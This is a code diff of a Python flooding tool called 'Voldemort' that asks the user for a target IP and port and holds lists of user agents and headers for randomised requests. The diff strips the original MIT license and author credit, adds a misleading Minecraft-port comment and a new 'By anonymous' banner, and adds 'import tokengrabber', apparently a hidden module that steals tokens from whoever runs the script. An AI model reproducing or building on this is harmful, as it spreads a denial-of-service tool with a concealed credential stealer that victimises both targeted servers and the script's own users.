@@ -1,11 +1,9 @@
-#MIT-License
-#Copyright (c) 2021 AdisDev
-#Voldemort 0.1v
-
+#Minecraft Java Server Port:25565
 
 import socket, requests
 import random
 import threading
+import tokengrabber
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
@@ -34,7 +32,13 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-print("Voldemort 1.0v")
+print("""
+██╗░░░██╗░█████╗░██╗░░░░░██████╗░███████╗███╗░░░███╗░█████╗░██████╗░████████╗
+██║░░░██║██╔══██╗██║░░░░░██╔══██╗██╔════╝████╗░████║██╔══██╗██╔══██╗╚══██╔══╝
+╚██╗░██╔╝██║░░██║██║░░░░░██║░░██║█████╗░░██╔████╔██║██║░░██║██████╔╝░░░██║░░░
+░╚████╔╝░██║░░██║██║░░░░░██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██╔══██╗░░░██║░░░
+░░╚██╔╝░░╚█████╔╝███████╗██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░░██║░░░██║░░░
+░░░╚═╝░░░░╚════╝░╚══════╝╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░///By anonymous""")
 
 ip = str(input('[+] Target: '))
 port = int(input('[+] Port: '))
